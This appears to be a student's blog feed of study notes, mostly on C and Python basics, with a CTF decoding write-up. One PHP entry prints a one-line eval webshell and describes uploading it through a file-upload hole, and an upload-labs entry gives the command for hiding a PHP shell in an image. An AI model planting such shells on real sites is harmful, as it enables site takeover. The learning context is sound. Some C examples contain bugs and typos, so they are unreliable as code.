    <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
<p>1 定义语句、执行语句以分号 ；结尾</p>
<p>2 必须有主函数   main（）</p>
<p>3 标识符由字母、数字和下画线-组成，</p>
<p>第一个字符必须是字母或下画线</p>
<p>4 char字符型                 字符型数据（char），用来储存字符</p>
<p>​                                       储存内容为字符对于ASCII 码</p>
<p>5 getchar 是从键盘缓冲区获取一个字符（输入单个字时）</p>
<p>而putchar是把参数指定的字符变量的字符输出（输出单个字符）</p>
<p>eg：char ch；</p>
<p>​         ch=getchar（): 运行到这里输入一个字符后必须回车一下getchar才返回</p>
<p>putchar （ch）</p>
<p>8 小数四舍五入  scanf （”%f”，&amp;a）</p>
<p>​                             a=int（a*1000+0.5）/1000.0</p>
<p>​                             printf(“%0.3f”,a)</p>
<p>C中保留两位小数</p>
<p>1、float a=3.456</p>
<p>​      float b=(int)(a*1000+0.5)/100.0</p>
<p>2、float a=23,456789</p>
<p>​      printf(“%2f”,a);</p>
<p>9 scanf( )式格式输入函数</p>
<p>它从标准输入设备(键盘)读取输入的信息</p>
<p>10 double area</p>
<p>建立一个类型为双精度浮点小数的变量，这个变量的名称是area</p>
<p>%5.2f含义：输出一个浮点数</p>
<p>格式为小数点前最多保留5位有效数字</p>
<p>​            小数点后最多保留2位有效数字</p>
<h4 id="在C语言中，能够获取字符串的函数至少有两个："><a href="#在C语言中，能够获取字符串的函数至少有两个：" class="headerlink" title="在C语言中，能够获取字符串的函数至少有两个："></a>在C语言中，能够获取字符串的函数至少有两个：</h4><p>1.scanf()</p>
<p>所在头文件：stdio.h</p>
<p>语法：scanf(“格式控制字符串”,变量地址列表);</p>
<p>接受字符串时：scanf(“%s”,字符数组名或指针);</p>
<p>2.gets()</p>
<p>所在头文件：stdio.h</p>
<p>语法：gets(字符数组名或指针);</p>
<p>两者在接受字符串时：</p>
<p>1.不同点：<br>gets可以接收空格；而scanf遇到空格、回车和Tab键都会认为输</p>
<p>入结束，所有它不能接收空格。</p>
<p>2.相同点：</p>
<p>字符串接受结束后自动加’\0’。</p>
<h4 id="printf和puts的区别"><a href="#printf和puts的区别" class="headerlink" title="printf和puts的区别"></a>printf和puts的区别</h4><p>相同点：<br>两者都属于stdio.h这个头文件<br>都能输出字符串</p>
<p>不同点：<br>puts（）在输出字符串时会将’\0’自动转换成’\n’进行输出，也就是说，puts方法输出完字符串后会自动换行。</p>
<ul>
<li><h2 id><a href="#" class="headerlink" title></a></h2></li>
</ul>
<p> hexo new post 新建文章</p>
<p>C 程序主要包括以下部分：</p>
<ul>
<li><p>预处理器指令</p>
</li>
<li><p>函数</p>
</li>
<li><p>变量</p>
</li>
<li><p>语句 &amp; 表达式</p>
</li>
<li><p>注释</p>
<p>变量其实只不过是程序可操作的存储区的名称</p>
<table>
<thead>
<tr>
<th>char</th>
<th>通常是一个字节（八位）。这是一个整数类型。</th>
</tr>
</thead>
<tbody><tr>
<td>int</td>
<td>对机器而言，整数的最自然的大小。</td>
</tr>
<tr>
<td>float</td>
<td>单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。</td>
</tr>
<tr>
<td>double</td>
<td>双精度浮点值。双精度是1位符号，11位指数，52位小数。</td>
</tr>
<tr>
<td>void</td>
<td>表示类型的缺失。</td>
</tr>
</tbody></table>
</li>
</ul>
<p>   C 程序中可用的存储类：</p>
<ul>
<li><p>auto</p>
</li>
<li><p>register</p>
</li>
<li><p>static</p>
</li>
<li><p>extern</p>
</li>
</ul>
<p>求余、模运算符（%）时bai要求两数必须是整型数据。%就是bai取余数运算,也就是模运算（mod）。</p>
<p>10/3在C语言里是整除的意思，结果是3</p>
<p>10%3是求余，结果是余数1</p>
<p>10.0/3会转换为两个double型的数相除，答案是3.3333</p>
<p>   7%4的结果是3<br>   -7%4的结果是-3<br>   3%-4的结果是3（**<em>结果符号与被除数相同**</em>）</p>
<p>代码输入时无需特意对齐，注意符号即可。</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>占用内存有关</title>
    <url>/2020/10/15/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/</url>
    <content><![CDATA[<p>让整数占用更少的内存可以在 int 前边加 short，让整数占用更多的内存可以在 int 前边加 long，例如：</p>
<p>short int a = 10;<br>short int b, c = 99;<br>long int m = 102023;<br>long int n, p = 562131;</p>
<p>这样 a、b、c 只占用 2 个字节的内存，而 m、n、p 可能会占用 8 个字节的内存。</p>
<p>也可以将 int 省略，只写 short 和 long，如下所示：</p>
<p>short a = 10;<br>short b, c = 99;<br>long m = 102023;<br>long n, p = 562131;</p>
<p>这样的写法更加简洁，实际开发中常用。</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串连接</title>
    <url>/2020/12/07/c/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<h4 id="今日：与字符串链接有关的函数"><a href="#今日：与字符串链接有关的函数" class="headerlink" title="今日：与字符串链接有关的函数"></a>今日：与字符串链接有关的函数</h4><p>strcpy，strcat；<br>strcat函数：<br>将两个char类型连接。<br>strcpy函数：<br>头文件：#include &lt; string.h&gt; 和 #include &lt;stdio.h&gt;<br>功能：把从src地址开始且含有NULL结束符的字符串复制到以dest开始的 地址空间</p>
<p>​                              可变参数  链接：<a href="https://blog.csdn.net/longintchar/article/details/85490103">https://blog.csdn.net/longintchar/article/details/85490103</a></p>
<p>[^摘取自链接：<a href="https://blog.csdn.net/slk11580/article/details/79571478]">https://blog.csdn.net/slk11580/article/details/79571478]</a>: </p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>指针</title>
    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<p> 指针和指针变量</p>
<p>char *pa;//  定义一个指向字符型的指针变量；</p>
<p>int *pb;//   定义一个指向整型的指针变量；</p>
<p>取地址运算符  &amp;</p>
<p>取值运算符   *</p>
<p>未理解的</p>
<p>（now，a）</p>
<p>( the addr of a is)</p>
<p>避免访问未初始化的指针</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>php拓展</title>
    <url>/2021/02/19/php/php%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>最简单的一句话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? php @eval($_POST[&#39;attack&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>​        利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过蚁剑即可获取和控制整个网站目录。</p>
<p>​        @表示后面即使执行错误，也不报错。<strong>eval（）函数</strong>表示括号内的语句字符串什么/.的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。（也就是[‘     ‘]里的数值可以改变，作为密码）</p>
<h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>​                    （1）木马上传成功，未被杀；<br>​                    （2）知道木马的路径在哪；<br>​                    （3）上传的木马能正常运行。</p>
<h4 id="php-require-once的使用方法总结"><a href="#php-require-once的使用方法总结" class="headerlink" title="php require_once的使用方法总结"></a>php require_once的使用方法总结</h4><p><a href="https://www.php.cn/php-weizijiaocheng-370472.html">https://www.php.cn/php-weizijiaocheng-370472.html</a></p>
<p>​        require_once 语句和 require 语句完全相同，唯一区别是</p>
<p> require_once() 语句在脚本执行期间包括并运行指定文件。此行为和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。</p>
<p>例子：</p>
<p>比如你写了一个类文件a.php，这个文件主要是定义类，代码可能如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">&#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">echo</span> $a;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>这个时候你在文件b.php中要使用到该类，就可以再b.php开头加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require_once(a.php);</span><br></pre></td></tr></table></figure>

<p>来加载这个a.php，就相当于把a.php的文件的代码复制到了b.php中。</p>
<p>类似的方法还有requeire(),include(),include_once()其中带_once字样的方法都是声明只加载一次，因为你require_once()的别文件中可能已经require_once(a.php)了，如果再加载就造成重复加载，代码量会增加造成解析减慢。</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>程序实验三</title>
    <url>/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
    <content><![CDATA[<p> 1、整数取反时，可用到reverse函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int reverse(int n)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​          int temp&#x3D;0;</span><br><span class="line">​	while (n!&#x3D;0)</span><br><span class="line">​	&#123;</span><br><span class="line">​		temp&#x3D;temp*10+n%10;</span><br><span class="line">​		n&#x3D;n&#x2F;10;</span><br><span class="line">​		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	return temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、倒金字塔</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i,n,j;</span><br><span class="line">	printf(&quot;请输入一个整数: \n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  for(j&#x3D;1;j&lt;i;j++)</span><br><span class="line">	    printf(&quot; &quot;);</span><br><span class="line">     	for(j&#x3D;2*n-1;j&gt;&#x3D;2*i-1;j--)</span><br><span class="line">     	printf(&quot;*&quot;);</span><br><span class="line">	     printf(&quot;\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、求和</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,n,i,j,sum;</span><br><span class="line">	printf(&quot;请输入两个整数分别为a&#x3D; n&#x3D; \n&quot;);</span><br><span class="line">	scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">	sum&#x3D;0,j&#x3D;0;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">		j&#x3D;j*10+a;</span><br><span class="line">		sum&#x3D;sum+j;</span><br><span class="line">		printf(&quot;a+aa+aaa+.....&#x3D;%d\n&quot;,sum);</span><br><span class="line">	&#125; </span><br><span class="line">	return 0;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>水仙花数、素数</title>
    <url>/2020/10/31/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/</url>
    <content><![CDATA[<p>   <strong>水仙花数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,b,c,d;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">	b&#x3D;a&#x2F;100;</span><br><span class="line">	c&#x3D;a&#x2F;10%10;</span><br><span class="line">	d&#x3D;a%10;</span><br><span class="line">	if(b*100+c*10+d&#x3D;&#x3D;b*b*b+c*c*c+d*d*d) printf(&quot;Yes&quot;);</span><br><span class="line">	else  printf(&quot;No&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意取余，若要求求出范围内的所有水仙花数，则用for语句。</p>
<p>​    <strong>素数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int IsPrime(int x)</span><br><span class="line"></span><br><span class="line">&#123;  int i;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;2;i&lt;x;i++)</span><br><span class="line"></span><br><span class="line">if(!(x%i))</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">rerurn 1;</span><br><span class="line"></span><br><span class="line">&#125;                                     </span><br></pre></td></tr></table></figure>

<p> 解释：x%i 的意思是 x对i求余，整个意思是 ：如果 x对i的余数是0      则为真</p>
<p>​                                                   就接着执行下面的程序。 </p>
<p>​                                                           </p>
<h3 id="写prime函数判断一个数是否是素数"><a href="#写prime函数判断一个数是否是素数" class="headerlink" title="写prime函数判断一个数是否是素数"></a>写prime函数判断一个数是否是素数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main ( )</span><br><span class="line">&#123;</span><br><span class="line">int m,n,i,j,k;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);</span><br><span class="line">for(i&#x3D;m;i&lt;&#x3D;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(i&#x3D;&#x3D;2) &#123; &#x2F;&#x2F;如果是bai2， 直接输出。</span><br><span class="line">printf( &quot;%d &quot;, i);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">for(j&#x3D;2;j&lt;i;j++) &#x2F;&#x2F;应该是j&lt;i</span><br><span class="line">if(i%j&#x3D;&#x3D;0) break; &#x2F;&#x2F;这个break只能跳du出最内层的for循环</span><br><span class="line">if(j&#x3D;&#x3D;i) printf(&quot;%d &quot;,i); &#x2F;&#x2F;printf应该放到循zhi环外，并且只有当j&#x3D;&#x3D;i的时候i才是dao素数</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>新手区</title>
    <url>/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
    <content><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>打开后文档如图</p>
<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p>
<p>明显没有flag，试着用编辑器看了下，找到隐含文字</p>
<p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p>
<p>看上去像是base64，解码后果然没那么简单，提示信息flag也不在这里</p>
<p>那么我们再从文本出发</p>
<p>ctrl+a后到文本中，有线索了！</p>
<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p>
<p>出现了诸如BA的排列组合，联想到之前的文字里：**(find mr.morse text)**提示我们摩斯电码</p>
<p>这里刚好莫斯电码就是以 - 和 . 来表达信息的，于是我们进行替换</p>
<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p>
<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p>
<p>得到了摩斯电码后，直接上在线编码即可</p>
<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p>
<p>如图，flag</p>
<p>不过我们还要按照题目要求将FLAG后字母小写，得到最后解答。</p>
]]></content>
      <tags>
        <tag>攻防世界_misc</tag>
      </tags>
  </entry>
  <entry>
    <title>图片马</title>
    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
<p>  如 1.jpg与 2.php同在桌面，则：</p>
<p>  cd   desktop</p>
<ol start="2">
<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
<p>​    </p>
</li>
</ol>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>python_visual</title>
    <url>/2021/07/19/python/python-visual/</url>
    <content><![CDATA[<p>​    使用Plotly可视化仓库</p>
<p>​    创建了可视化python图表，以html形式呈现</p>
<p><img src="/2021/07/19/python/python-visual/image-20210719204819823.png" alt="image-20210719204819823"></p>
<p>上图为Github上python库受欢迎程度</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from plotly.graph_objs import Bar</span><br><span class="line">from plotly import offline</span><br><span class="line"></span><br><span class="line">#执行API调用并存储响应</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;search&#x2F;repositories?q&#x3D;language:python&amp;sort&#x3D;stars&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Accept&#39;:&#39;application&#x2F;vnd.github.v3+json&#39;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(f&quot;Status code: &#123;r.status_code&#125;&quot;)</span><br><span class="line">response_dict &#x3D; r.json()</span><br><span class="line">repo_dicts &#x3D; response_dict[&#39;items&#39;]</span><br><span class="line">repo_names,stars &#x3D; [], []</span><br><span class="line">for repo_dict in repo_dicts:</span><br><span class="line">    repo_names.append(repo_dict[&#39;name&#39;])</span><br><span class="line">    stars.append(repo_dict[&#39;stargazers_count&#39;])</span><br><span class="line"></span><br><span class="line">#可视化</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">    &#39;type&#39;: &#39;bar&#39;,</span><br><span class="line">    &#39;x&#39;: repo_names,</span><br><span class="line">    &#39;y&#39;:stars,</span><br><span class="line">&#125;]</span><br><span class="line">my_layout &#x3D; &#123;</span><br><span class="line">    &#39;title&#39;:&#39;Github上最受欢迎的Python项目&#39;,</span><br><span class="line">    &#39;xaxis&#39;:&#123;&#39;title&#39;: &#39;Repository&#39;&#125;,</span><br><span class="line">    &#39;yaxis&#39;:&#123;&#39;title&#39;:&#39;Stars&#39;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">fig &#x3D; &#123;&#39;data&#39;: data, &#39;layout&#39;:my_layout&#125;</span><br><span class="line">offline.plot(fig, filename&#x3D;&#39;python_repos.html&#39;)</span><br></pre></td></tr></table></figure>

<p>Status code: 200 ，意味着访问成功。</p>
<p>Tips:如果遇到代码运行失败并且是出现了如下类似错误</p>
<hr>
<p>Traceback (most recent call last)<br><strong>C:\Users\mr-chen\Anaconda3\envs\hadoop\lib\site-packages\urllib3\connection.py in _new_conn(self)</strong><br> 158             conn = connection.create_connection(</p>
<hr>
<p>这是因为url路径为GitHub的网站，对于国内访问的我们来说不稳定</p>
<p>即使添加进了hosts文件也偶尔会出现访问失败的情况</p>
<p>在代码运行是就会出现上述traceback报错报告。</p>
<p>找到解决方法的相关文章来源于：</p>
<p><a href="https://blog.csdn.net/visoprkx/article/details/88925116">使用python pyhdfs操作hadoop 出现ConnectionError: HTTPConnectionPool(host=’bigdata-senior03.chybinmy.com’_visoprkx的专栏-CSDN博客</a></p>
<p>改进Plotly图表、添加自定义工具提示、在图表中添加可单击的链接后的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from plotly.graph_objs import Bar</span><br><span class="line">from plotly import offline</span><br><span class="line"></span><br><span class="line">#执行API调用并存储响应</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;search&#x2F;repositories?q&#x3D;language:python&amp;sort&#x3D;stars&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Accept&#39;:&#39;application&#x2F;vnd.github.v3+json&#39;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(f&quot;Status code: &#123;r.status_code&#125;&quot;)</span><br><span class="line">response_dict &#x3D; r.json()</span><br><span class="line">repo_dicts &#x3D; response_dict[&#39;items&#39;]</span><br><span class="line">repo_links, stars, labels &#x3D; [], [], []</span><br><span class="line">for repo_dict in repo_dicts:</span><br><span class="line">    repo_name &#x3D; repo_dict[&#39;name&#39;]</span><br><span class="line">    repo_url &#x3D; repo_dict[&#39;html_url&#39;]</span><br><span class="line">    repo_link &#x3D; f&quot;&lt;a href&#x3D;&#39;&#123;repo_url&#125;&#39;&gt;&#123;repo_name&#125;&lt;&#x2F;a&gt;&quot;</span><br><span class="line">    repo_links.append(repo_link)</span><br><span class="line">    stars.append(repo_dict[&#39;stargazers_count&#39;])</span><br><span class="line"></span><br><span class="line">    owner &#x3D; repo_dict[&#39;owner&#39;][&#39;login&#39;]</span><br><span class="line">    description &#x3D; repo_dict[&#39;description&#39;]</span><br><span class="line">    label &#x3D; f&quot;&#123;owner&#125;&lt;br &#x2F;&gt;&#123;description&#125;&quot;</span><br><span class="line">    labels.append(label)</span><br><span class="line"></span><br><span class="line">#可视化</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">    &#39;type&#39;: &#39;bar&#39;,</span><br><span class="line">    &#39;x&#39;: repo_links,</span><br><span class="line">    &#39;y&#39;:stars,</span><br><span class="line">    &#39;hovertext&#39;: labels,</span><br><span class="line">    &#39;marker&#39;: &#123;</span><br><span class="line">        &#39;color&#39;: &#39;rgb(60, 100, 150)&#39;,</span><br><span class="line">        &#39;line&#39;: &#123;&#39;width&#39;: 1.5, &#39;color&#39;: &#39;rgb(25,25,25)&#39;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;opacity&#39;: 0.6  #CSS opacity 属性 如设置 div 元素的不透明级别，这里设置了条形的不透明度为0.6，以免图表过于惹眼。</span><br><span class="line">&#125;]</span><br><span class="line">my_layout &#x3D; &#123;</span><br><span class="line">    &#39;title&#39;: &#39;Github上最受欢迎的Python项目&#39;,</span><br><span class="line">    &#39;titlefont&#39;: &#123;&#39;size&#39;: 28&#125;,</span><br><span class="line">    &#39;xaxis&#39;:&#123;</span><br><span class="line">        &#39;title&#39;: &#39;Repository&#39;,</span><br><span class="line">        &#39;titlefont&#39;: &#123;&#39;size&#39;: 24&#125;,</span><br><span class="line">        &#39;tickfont&#39;: &#123;&#39;size&#39;: 14&#125;,</span><br><span class="line"></span><br><span class="line">             &#125;,</span><br><span class="line">    &#39;yaxis&#39;:&#123;</span><br><span class="line">        &#39;title&#39;:&#39;Stars&#39;,</span><br><span class="line">        &#39;titlefont&#39;: &#123;&#39;size&#39;: 24&#125;,</span><br><span class="line">        &#39;tickfont&#39;: &#123;&#39;size&#39;: 14&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">fig &#x3D; &#123;&#39;data&#39;: data, &#39;layout&#39;:my_layout&#125;</span><br><span class="line">offline.plot(fig, filename&#x3D;&#39;python_repos.html&#39;)</span><br></pre></td></tr></table></figure>



<p><img src="/2021/07/19/python/python-visual/image-20210720101944206.png" alt="image-20210720101944206"></p>
<p><img src="/2021/07/19/python/python-visual/image-20210720102734849.png" alt="image-20210720102734849"></p>
<p>至此，我们对API获取的数据生成了可视化图表，它是交互性的，包含丰富的信息。</p>
<p>​                                                                        ——以上代码和部分内容来源于《Python编程 从入门到实践》</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫</title>
    <url>/2021/05/19/python/%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<p> 今天终于是成功做到了python爬虫</p>
<p>之前的失败</p>
<p>总结了一下太想当然直接搬人家代码</p>
<p>所以有些库没安装都不认真看</p>
<p>小小开心一下，嘿嘿</p>
<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(214).png"></p>
<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(215).png"></p>
<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(216).png"></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python</title>
    <url>/2021/04/08/python/python-picture/</url>
    <content><![CDATA[<h4 id="“Python之禅”"><a href="#“Python之禅”" class="headerlink" title="“Python之禅”"></a>“<strong>Python之禅”</strong></h4><p>The Zen of Python, by Tim Peters</p>
<p>Beautiful is better than ugly.<br>Explicit is better than implicit.<br>Simple is better than complex.<br>Complex is better than complicated.<br>Flat is better than nested.<br>Sparse is better than dense.<br>Readability counts.<br>Special cases aren’t special enough to break the rules.<br>Although practicality beats purity.<br>Errors should never pass silently.<br>Unless explicitly silenced.<br>In the face of ambiguity, refuse the temptation to guess.<br>There should be one– and preferably only one –obvious way to do it.<br>Although that way may not be obvious at first unless you’re Dutch.<br>Now is better than never.<br>Although never is often better than <em>right</em> now.<br>If the implementation is hard to explain, it’s a bad idea.<br>If the implementation is easy to explain, it may be a good idea.<br>Namespaces are one honking great idea – let’s do more of those!   </p>
<h3 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h3><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png"></p>
<p>在字符串中使用变量</p>
<p><code>first_name = &quot;ada&quot;</code><br><code>last_name = &quot;lovelace&quot;</code><br><code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
<p>要在字符串中插入变量的值，可在引号面前加上字母f，再将要插入的变量放在花括号内。这样，当python显示字符串时，将把每个变量都替换为其值。</p>
<p>这种字符串名为f字符串。f是format格式（设置格式）的简写，因为python通过把花括号内的变量替换为其值来设置字符串的格式。上述输出的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ada lovace</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png"></p>
<p>last_owned = motorcycles.pop[0],默认是将最后一个元素“弹出栈元素”</p>
<p>remove删除特定元素</p>
<p>sort自动排序</p>
<h4 id="关于循环"><a href="#关于循环" class="headerlink" title="关于循环"></a>关于循环</h4><p>如定义变量dimension = （200，50）</p>
<p>使用循环时却是：for dimension in dimensions:</p>
<p>​                               print(dimensions)</p>
<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(132).png"></p>
<h4 id="闲暇的佩奇"><a href="#闲暇的佩奇" class="headerlink" title="闲暇的佩奇"></a>闲暇的佩奇</h4><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(131).png"></p>
<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>一度中断，貌似是为了之前的python2.7.11来执行sqlmap，这次好像不能同时添加路径，不然就报错</p>
<h4 id="windows终端运行python程序"><a href="#windows终端运行python程序" class="headerlink" title="windows终端运行python程序"></a>windows终端运行python程序</h4><p>如下图所示嗷</p>
<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(133).png"></p>
<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>python的循环虽然没有像c语言一样样式看起来比较繁杂，</p>
<p>但是还是有一定要求的</p>
<p>比如尝试while循环时，出现了以下情况：</p>
<p>我想实现的功能是将1赋值给current_number后，进入循环，直到current_number大于5</p>
<p>这里没有空格（也就是和print对齐）造成了无限加1的画面。</p>
